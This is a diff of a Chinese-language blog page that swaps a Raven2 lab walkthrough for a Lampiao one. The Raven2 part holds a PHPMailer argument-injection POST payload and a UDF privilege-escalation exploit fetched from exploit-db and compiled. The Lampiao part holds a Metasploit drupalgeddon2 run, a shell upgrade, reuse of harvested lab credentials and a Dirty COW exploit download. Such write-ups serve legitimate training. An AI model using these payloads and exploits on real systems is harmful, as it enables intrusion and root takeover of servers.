@@ -96,22 +96,30 @@
 
 
 
-  <meta name="description" content="前言 难度中等，主要是想练习一下mysql udf提权，同时靶机也涉及了phpmailer的漏洞  渗透信息收集netdiscover -r 192.168.64.0/24   =&amp;gt;   192.168.64.148 nmap -oN nmap.txt -A 192.168.64.148 123456789101112131415161718192021222324PORT    STATE">
+  <meta name="description" content="前言靶机难度不大 渗透测试信息收集 IP 端口  netdiscover -r 192.168.64.0/24    ​    namp -A -oN nmap.txt 192.168.64.146 123456789101112131415PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu">
 <meta name="keywords" content="渗透测试,提权,vulnhub">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Raven2渗透实战">
-<meta property="og:url" content="https://songxpu.github.io/2019/08/10/Raven2/index.html">
+<meta property="og:title" content="Lampiao渗透实战">
+<meta property="og:url" content="https://songxpu.github.io/2019/08/10/Lampiao/index.html">
 <meta property="og:site_name" content="Pines404">
-<meta property="og:description" content="前言 难度中等，主要是想练习一下mysql udf提权，同时靶机也涉及了phpmailer的漏洞  渗透信息收集netdiscover -r 192.168.64.0/24   =&amp;gt;   192.168.64.148 nmap -oN nmap.txt -A 192.168.64.148 123456789101112131415161718192021222324PORT    STATE">
+<meta property="og:description" content="前言靶机难度不大 渗透测试信息收集 IP 端口  netdiscover -r 192.168.64.0/24    ​    namp -A -oN nmap.txt 192.168.64.146 123456789101112131415PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Raven2/web_dir1.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Raven2/web_dir2.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Raven2/msf_phpmailer.png">
-<meta property="og:updated_time" content="2019-08-10T09:37:29.404Z">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cip.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cport1.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/web1.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/web指纹.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/目录.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/msf_search.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/msf_options.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/msf_meter.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/源码目录.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cmysql_user.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/Lampiao/dirtycow.png">
+<meta property="og:updated_time" content="2019-08-10T10:02:29.189Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Raven2渗透实战">
-<meta name="twitter:description" content="前言 难度中等，主要是想练习一下mysql udf提权，同时靶机也涉及了phpmailer的漏洞  渗透信息收集netdiscover -r 192.168.64.0/24   =&amp;gt;   192.168.64.148 nmap -oN nmap.txt -A 192.168.64.148 123456789101112131415161718192021222324PORT    STATE">
-<meta name="twitter:image" content="https://songxpu.github.io/2019/08/10/Raven2/web_dir1.png">
+<meta name="twitter:title" content="Lampiao渗透实战">
+<meta name="twitter:description" content="前言靶机难度不大 渗透测试信息收集 IP 端口  netdiscover -r 192.168.64.0/24    ​    namp -A -oN nmap.txt 192.168.64.146 123456789101112131415PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu">
+<meta name="twitter:image" content="https://songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cip.png">
 
 
 
@@ -119,7 +127,7 @@
 
   
   
-  <link rel="canonical" href="https://songxpu.github.io/2019/08/10/Raven2/">
+  <link rel="canonical" href="https://songxpu.github.io/2019/08/10/Lampiao/">
 
 
 
@@ -129,7 +137,7 @@
   };
 </script>
 
-  <title>Raven2渗透实战 | Pines404</title>
+  <title>Lampiao渗透实战 | Pines404</title>
   
 
 
@@ -388,7 +396,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/08/10/Raven2/">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/08/10/Lampiao/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Azeroth">
@@ -405,7 +413,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Raven2渗透实战
+          <h1 class="post-title" itemprop="name headline">Lampiao渗透实战
 
               
             
@@ -431,7 +439,7 @@
                 
               
 
-              <time title="创建时间：2019-08-10 13:57:35 / 修改时间：17:37:29" itemprop="dateCreated datePublished" datetime="2019-08-10T13:57:35+08:00">2019-08-10</time>
+              <time title="创建时间：2019-08-10 17:52:11 / 修改时间：18:02:29" itemprop="dateCreated datePublished" datetime="2019-08-10T17:52:11+08:00">2019-08-10</time>
             
 
             
@@ -489,7 +497,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">4.1k</span>
+                <span title="本文字数">3.7k</span>
               
 
               
@@ -503,7 +511,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">4 分钟</span>
+                <span title="阅读时长">3 分钟</span>
               
             </div>
           
@@ -523,52 +531,128 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>难度中等，主要是想练习一下mysql udf提权，同时靶机也涉及了phpmailer的漏洞</p>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>靶机难度不大</p>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
+<li><p><strong>IP 端口</strong> </p>
+<p><code>netdiscover -r 192.168.64.0/24</code></p>
+</li>
+</ul>
+<p><img src="//songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cip.png" alt="1"></p>
+<p>​    <code>namp -A -oN nmap.txt 192.168.64.146</code></p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PORT</span>   <span class="selector-tag">STATE</span> <span class="selector-tag">SERVICE</span> <span class="selector-tag">VERSION</span></span><br><span class="line"><span class="selector-tag">22</span>/<span class="selector-tag">tcp</span> <span class="selector-tag">open</span>  <span class="selector-tag">ssh</span>     <span class="selector-tag">OpenSSH</span> <span class="selector-tag">6</span><span class="selector-class">.6</span><span class="selector-class">.1p1</span> <span class="selector-tag">Ubuntu</span> <span class="selector-tag">2ubuntu2</span><span class="selector-class">.7</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="selector-tag">ssh-hostkey</span>: </span><br><span class="line">|   <span class="selector-tag">1024</span> <span class="selector-tag">46</span><span class="selector-pseudo">:b1</span><span class="selector-pseudo">:99</span><span class="selector-pseudo">:60</span><span class="selector-pseudo">:7d</span><span class="selector-pseudo">:81</span><span class="selector-pseudo">:69</span><span class="selector-pseudo">:3c</span><span class="selector-pseudo">:ae</span><span class="selector-pseudo">:1f</span><span class="selector-pseudo">:c7</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:c3</span><span class="selector-pseudo">:66</span><span class="selector-pseudo">:e3</span><span class="selector-pseudo">:10</span> (DSA)</span><br><span class="line">|   <span class="selector-tag">2048</span> <span class="selector-tag">f3</span><span class="selector-pseudo">:e8</span><span class="selector-pseudo">:88</span><span class="selector-pseudo">:f2</span><span class="selector-pseudo">:2d</span><span class="selector-pseudo">:d0</span><span class="selector-pseudo">:b2</span><span class="selector-pseudo">:54</span><span class="selector-pseudo">:0b</span><span class="selector-pseudo">:9c</span><span class="selector-pseudo">:ad</span><span class="selector-pseudo">:61</span><span class="selector-pseudo">:33</span><span class="selector-pseudo">:59</span><span class="selector-pseudo">:55</span><span class="selector-pseudo">:93</span> (RSA)</span><br><span class="line">|   <span class="selector-tag">256</span> <span class="selector-tag">ce</span><span class="selector-pseudo">:63</span><span class="selector-pseudo">:2a</span><span class="selector-pseudo">:f7</span><span class="selector-pseudo">:53</span><span class="selector-pseudo">:6e</span><span class="selector-pseudo">:46</span><span class="selector-pseudo">:e2</span><span class="selector-pseudo">:ae</span><span class="selector-pseudo">:81</span><span class="selector-pseudo">:e3</span><span class="selector-pseudo">:ff</span><span class="selector-pseudo">:b7</span><span class="selector-pseudo">:16</span><span class="selector-pseudo">:f4</span><span class="selector-pseudo">:52</span> (ECDSA)</span><br><span class="line">|<span class="selector-tag">_</span>  <span class="selector-tag">256</span> <span class="selector-tag">c6</span><span class="selector-pseudo">:55</span><span class="selector-pseudo">:ca</span><span class="selector-pseudo">:07</span><span class="selector-pseudo">:37</span><span class="selector-pseudo">:65</span><span class="selector-pseudo">:e3</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:c1</span><span class="selector-pseudo">:d6</span><span class="selector-pseudo">:5b</span><span class="selector-pseudo">:77</span><span class="selector-pseudo">:dc</span><span class="selector-pseudo">:23</span><span class="selector-pseudo">:df</span><span class="selector-pseudo">:cc</span> (EdDSA)</span><br><span class="line"><span class="selector-tag">80</span>/<span class="selector-tag">tcp</span> <span class="selector-tag">open</span>  <span class="selector-tag">http</span>?</span><br><span class="line"><span class="selector-tag">MAC</span> <span class="selector-tag">Address</span>: <span class="selector-tag">00</span><span class="selector-pseudo">:0C</span><span class="selector-pseudo">:29</span><span class="selector-pseudo">:70</span><span class="selector-pseudo">:1E</span><span class="selector-pseudo">:63</span> (VMware)</span><br><span class="line"><span class="selector-tag">Device</span> <span class="selector-tag">type</span>: <span class="selector-tag">general</span> <span class="selector-tag">purpose</span></span><br><span class="line"><span class="selector-tag">Running</span>: <span class="selector-tag">Linux</span> <span class="selector-tag">3</span><span class="selector-class">.X</span>|<span class="selector-tag">4</span><span class="selector-class">.X</span></span><br><span class="line"><span class="selector-tag">OS</span> <span class="selector-tag">CPE</span>: <span class="selector-tag">cpe</span>:/<span class="selector-tag">o</span><span class="selector-pseudo">:linux</span><span class="selector-pseudo">:linux_kernel</span><span class="selector-pseudo">:3</span> <span class="selector-tag">cpe</span>:/<span class="selector-tag">o</span><span class="selector-pseudo">:linux</span><span class="selector-pseudo">:linux_kernel</span><span class="selector-pseudo">:4</span></span><br><span class="line"><span class="selector-tag">OS</span> <span class="selector-tag">details</span>: <span class="selector-tag">Linux</span> <span class="selector-tag">3</span><span class="selector-class">.2</span> <span class="selector-tag">-</span> <span class="selector-tag">4</span><span class="selector-class">.8</span></span><br><span class="line"><span class="selector-tag">Network</span> <span class="selector-tag">Distance</span>: <span class="selector-tag">1</span> <span class="selector-tag">hop</span></span><br><span class="line"><span class="selector-tag">Service</span> <span class="selector-tag">Info</span>: <span class="selector-tag">OS</span>: <span class="selector-tag">Linux</span>; <span class="selector-tag">CPE</span>: <span class="selector-tag">cpe</span>:/<span class="selector-tag">o</span><span class="selector-pseudo">:linux</span><span class="selector-pseudo">:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<p>访问80端口发现一个静态页面，且没有任何提示；怀疑开放了其他端口：</p>
+<p><code>nmap -sS -p 1-2000 192.168.64.146</code></p>
+<blockquote>
+<p>-sS    TCP SYN扫描</p>
 </blockquote>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>netdiscover -r 192.168.64.0/24</code>   =&gt;   192.168.64.148</p>
-<p><code>nmap -oN nmap.txt -A 192.168.64.148</code></p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PORT</span>    <span class="selector-tag">STATE</span> <span class="selector-tag">SERVICE</span> <span class="selector-tag">VERSION</span></span><br><span class="line"><span class="selector-tag">22</span>/<span class="selector-tag">tcp</span>  <span class="selector-tag">open</span>  <span class="selector-tag">ssh</span>     <span class="selector-tag">OpenSSH</span> <span class="selector-tag">6</span><span class="selector-class">.7p1</span> <span class="selector-tag">Debian</span> <span class="selector-tag">5</span>+<span class="selector-tag">deb8u4</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="selector-tag">ssh-hostkey</span>: </span><br><span class="line">|   <span class="selector-tag">1024</span> <span class="selector-tag">26</span><span class="selector-pseudo">:81</span><span class="selector-pseudo">:c1</span><span class="selector-pseudo">:f3</span><span class="selector-pseudo">:5e</span><span class="selector-pseudo">:01</span><span class="selector-pseudo">:ef</span><span class="selector-pseudo">:93</span><span class="selector-pseudo">:49</span><span class="selector-pseudo">:3d</span><span class="selector-pseudo">:91</span><span class="selector-pseudo">:1e</span><span class="selector-pseudo">:ae</span><span class="selector-pseudo">:8b</span><span class="selector-pseudo">:3c</span><span class="selector-pseudo">:fc</span> (DSA)</span><br><span class="line">|   <span class="selector-tag">2048</span> <span class="selector-tag">31</span><span class="selector-pseudo">:58</span><span class="selector-pseudo">:01</span><span class="selector-pseudo">:19</span><span class="selector-pseudo">:4d</span><span class="selector-pseudo">:a2</span><span class="selector-pseudo">:80</span><span class="selector-pseudo">:a6</span><span class="selector-pseudo">:b9</span><span class="selector-pseudo">:0d</span><span class="selector-pseudo">:40</span><span class="selector-pseudo">:98</span><span class="selector-pseudo">:1c</span><span class="selector-pseudo">:97</span><span class="selector-pseudo">:aa</span><span class="selector-pseudo">:53</span> (RSA)</span><br><span class="line">|   <span class="selector-tag">256</span> <span class="selector-tag">1f</span><span class="selector-pseudo">:77</span><span class="selector-pseudo">:31</span><span class="selector-pseudo">:19</span><span class="selector-pseudo">:de</span><span class="selector-pseudo">:b0</span><span class="selector-pseudo">:e1</span><span class="selector-pseudo">:6d</span><span class="selector-pseudo">:ca</span><span class="selector-pseudo">:77</span><span class="selector-pseudo">:07</span><span class="selector-pseudo">:76</span><span class="selector-pseudo">:84</span><span class="selector-pseudo">:d3</span><span class="selector-pseudo">:a9</span><span class="selector-pseudo">:a0</span> (ECDSA)</span><br><span class="line">|<span class="selector-tag">_</span>  <span class="selector-tag">256</span> <span class="selector-tag">0e</span><span class="selector-pseudo">:85</span><span class="selector-pseudo">:71</span><span class="selector-pseudo">:a8</span><span class="selector-pseudo">:a2</span><span class="selector-pseudo">:c3</span><span class="selector-pseudo">:08</span><span class="selector-pseudo">:69</span><span class="selector-pseudo">:9c</span><span class="selector-pseudo">:91</span><span class="selector-pseudo">:c0</span><span class="selector-pseudo">:3f</span><span class="selector-pseudo">:84</span><span class="selector-pseudo">:18</span><span class="selector-pseudo">:df</span><span class="selector-pseudo">:ae</span> (ED25519)</span><br><span class="line"><span class="selector-tag">80</span>/<span class="selector-tag">tcp</span>  <span class="selector-tag">open</span>  <span class="selector-tag">http</span>    <span class="selector-tag">Apache</span> <span class="selector-tag">httpd</span> <span class="selector-tag">2</span><span class="selector-class">.4</span><span class="selector-class">.10</span> ((Debian))</span><br><span class="line">|<span class="selector-tag">_http-server-header</span>: <span class="selector-tag">Apache</span>/<span class="selector-tag">2</span><span class="selector-class">.4</span><span class="selector-class">.10</span> (Debian)</span><br><span class="line">|<span class="selector-tag">_http-title</span>: <span class="selector-tag">Raven</span> <span class="selector-tag">Security</span></span><br><span class="line"><span class="selector-tag">111</span>/<span class="selector-tag">tcp</span> <span class="selector-tag">open</span>  <span class="selector-tag">rpcbind</span> <span class="selector-tag">2-4</span> (RPC <span class="number">#100000</span>)</span><br><span class="line">| <span class="selector-tag">rpcinfo</span>: </span><br><span class="line">|   <span class="selector-tag">program</span> <span class="selector-tag">version</span>   <span class="selector-tag">port</span>/<span class="selector-tag">proto</span>  <span class="selector-tag">service</span></span><br><span class="line">|   <span class="selector-tag">100000</span>  <span class="selector-tag">2</span>,<span class="selector-tag">3</span>,<span class="selector-tag">4</span>        <span class="selector-tag">111</span>/<span class="selector-tag">tcp</span>  <span class="selector-tag">rpcbind</span></span><br><span class="line">|   <span class="selector-tag">100000</span>  <span class="selector-tag">2</span>,<span class="selector-tag">3</span>,<span class="selector-tag">4</span>        <span class="selector-tag">111</span>/<span class="selector-tag">udp</span>  <span class="selector-tag">rpcbind</span></span><br><span class="line">|   <span class="selector-tag">100024</span>  <span class="selector-tag">1</span>          <span class="selector-tag">48650</span>/<span class="selector-tag">tcp</span>  <span class="selector-tag">status</span></span><br><span class="line">|<span class="selector-tag">_</span>  <span class="selector-tag">100024</span>  <span class="selector-tag">1</span>          <span class="selector-tag">53215</span>/<span class="selector-tag">udp</span>  <span class="selector-tag">status</span></span><br><span class="line"><span class="selector-tag">MAC</span> <span class="selector-tag">Address</span>: <span class="selector-tag">00</span><span class="selector-pseudo">:0C</span><span class="selector-pseudo">:29</span><span class="selector-pseudo">:B2</span><span class="selector-pseudo">:C8</span><span class="selector-pseudo">:AD</span> (VMware)</span><br><span class="line"><span class="selector-tag">Device</span> <span class="selector-tag">type</span>: <span class="selector-tag">general</span> <span class="selector-tag">purpose</span></span><br><span class="line"><span class="selector-tag">Running</span>: <span class="selector-tag">Linux</span> <span class="selector-tag">3</span><span class="selector-class">.X</span>|<span class="selector-tag">4</span><span class="selector-class">.X</span></span><br><span class="line"><span class="selector-tag">OS</span> <span class="selector-tag">CPE</span>: <span class="selector-tag">cpe</span>:/<span class="selector-tag">o</span><span class="selector-pseudo">:linux</span><span class="selector-pseudo">:linux_kernel</span><span class="selector-pseudo">:3</span> <span class="selector-tag">cpe</span>:/<span class="selector-tag">o</span><span class="selector-pseudo">:linux</span><span class="selector-pseudo">:linux_kernel</span><span class="selector-pseudo">:4</span></span><br><span class="line"><span class="selector-tag">OS</span> <span class="selector-tag">details</span>: <span class="selector-tag">Linux</span> <span class="selector-tag">3</span><span class="selector-class">.2</span> <span class="selector-tag">-</span> <span class="selector-tag">4</span><span class="selector-class">.9</span></span><br><span class="line"><span class="selector-tag">Network</span> <span class="selector-tag">Distance</span>: <span class="selector-tag">1</span> <span class="selector-tag">hop</span></span><br><span class="line"><span class="selector-tag">Service</span> <span class="selector-tag">Info</span>: <span class="selector-tag">OS</span>: <span class="selector-tag">Linux</span>; <span class="selector-tag">CPE</span>: <span class="selector-tag">cpe</span>:/<span class="selector-tag">o</span><span class="selector-pseudo">:linux</span><span class="selector-pseudo">:linux_kernel</span></span><br></pre></td></tr></table></figure>
+<p><img src="//songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cport1.png" alt="2"></p>
+<p>访问<code>192.168.64.146:1898</code></p>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/web1.png" width="700">
 
-<p><code>dirb 192.168.64.148</code>   =&gt;   /vendor/   /wordpress/</p>
-<p>其中wordpress无法正常打开，vendor存在目录遍历，并发现phpmailer 5.2.16，存在漏洞</p>
-<img src="//songxpu.github.io/2019/08/10/Raven2/web_dir1.png" width="500px" height>
+<ul>
+<li><p><strong>web指纹</strong></p>
+<p><code>whatweb http://192.168.64.146:1898</code></p>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/web指纹.png" width="800">
 
-<img src="//songxpu.github.io/2019/08/10/Raven2/web_dir2.png" width="500" height>
+</li>
+</ul>
+<p>根据网页下方版权亦可看出，站点CMS为<strong>Drupal</strong></p>
+<ul>
+<li><strong>web目录</strong></li>
+</ul>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/目录.png" width="700">
 
-<h3 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h3><p>msf：<code>searchsploit phpmailer</code></p>
-<img src="//songxpu.github.io/2019/08/10/Raven2/msf_phpmailer.png" width="700" height>
+<h4 id="获取会话"><a href="#获取会话" class="headerlink" title="获取会话"></a>获取会话</h4><p>（1）<strong>metasploit</strong></p>
+<p><code>search Drupal</code></p>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/msf_search.png" width="700">
 
-<p>选择python那个脚本，修改exp配置：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">options</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/08/10/Lampiao/msf_options.png" width="700">
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> php_func system</span><br><span class="line"><span class="builtin-name">set</span> RHOSTS 192.168.64.146</span><br><span class="line"><span class="builtin-name">set</span> rport 1898</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/08/10/Lampiao/msf_meter.png" width="700">
+
+<h4 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h4><blockquote>
+<p>msf的shell不是完整的shell，交互不完整；</p>
+<p>恰好此处安装了python，可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生虚拟终端</p>
+</blockquote>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="bash"></span></span><br><span class="line"><span class="bash">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>首先获取系统信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@lampiao:~/html$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@lampiao:~/html$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br><span class="line">www-data@lampiao:~/html$ cat /proc/version</span><br><span class="line">cat /proc/version</span><br><span class="line">Linux version 4.4.0-31-generic (buildd@lgw01-01) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016</span><br></pre></td></tr></table></figure>
+
+<p>其次审计web源码，是否能从中获取一些有用信息</p>
+<p>打包web源码:<code>tar -czvf web.tar.gz ../html</code></p>
+<blockquote>
+<p>Linux tar命令用于备份文件。</p>
+<p>tar是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。</p>
+<p>-c    新建打包文件，同 -v 一起使用 查看过程中打包文件名<br>-z    通过gzip方式压缩或解压，最后以.tar.gz 为后缀<br>-v    压缩或解压过程中，显示出来过程<br>-f    后面接要处理的文件<br>-x    解决文件， -C 解压到对应的文件目录<br>-t    列出备份文件的内容。</p>
+<p>##########################################################################</p>
+<p>压缩：tar -czvf web.tar.gz ../html</p>
+<p>解压：tar -xzvf web.tar.gz </p>
+<p>列出压缩文件内容：tar -tzvf test.tar.gz </p>
+</blockquote>
+<p><strong>WEB源码目录</strong>：</p>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/源码目录.png" width="700">
+
+<p>其中有用的信息:</p>
 <ol>
-<li>修改target为靶机的ip，利用文件为/contact.php</li>
-<li>修改后门文件路径，默认的用不了</li>
-<li>修改反弹shell的ip与端口</li>
+<li>qrc.png =&gt;二维码 （加油信息）</li>
+<li>audio.m4a =&gt;音频信息 （user:tiago）</li>
+<li>/sites/default/settings.php =&gt;web配置文件</li>
 </ol>
-<p>这里当然可以手工利用，抓包并向contact.php文件post数据：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/contact.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.64.148</span><br><span class="line"><span class="attribute">Content-Length</span>: 153</span><br><span class="line"><span class="attribute">Accept</span>: text/html, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.64.148</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.64.148/contact.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">action=submit&amp;name=&lt;?php phpinfo();?&gt;&amp;email="anarcoder\" -OQueueDirectory=/tmp -X/var/www/html/test.php server" @protonmail.com&amp;subject=123&amp;message=Pwned</span><br></pre></td></tr></table></figure>
+<p>其中settins.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'default'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'default'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">'database'</span> =&gt; <span class="string">'drupal'</span>,</span><br><span class="line">      <span class="string">'username'</span> =&gt; <span class="string">'drupaluser'</span>,</span><br><span class="line">      <span class="string">'password'</span> =&gt; <span class="string">'Virgulino'</span>,</span><br><span class="line">      <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">      <span class="string">'port'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">      <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">      <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 
-<p>提交或执行后，在kali上成功获取到反弹的shell，再使用python创建一个虚拟终端：</p>
-<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
-<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>发现存在mysql进程，尝试udf提权：</p>
-<p>先在kali中下载exp并编译下来：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/1518#下载exp</span><br><span class="line">mv ./1518 ./1518.c </span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so 1518.o -lc</span><br></pre></td></tr></table></figure>
+<p>此处使用该账号信息进入到mysql，从user表中获取到Linux的账号信息</p>
+<p><img src="//songxpu.github.io/2019/08/10/Lampiao/Lampiao%5Cmysql_user.png" alt="9"></p>
+<p>ps：此处应该可以尝试暴力破解，但加了salt很难破解，需要通过工具字典爆。</p>
+<p>但通过网络教程来看，用户tiago的密码恰好为Virgulino，通过ssh登录成功。</p>
+<p>通过脏牛提权</p>
+<blockquote>
+<p>CVE-2016-5195</p>
+<p>脏牛（Dirty COW）</p>
+<p>Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p>
+</blockquote>
+<p><code>wget https://www.exploit-db.com/download/40847</code></p>
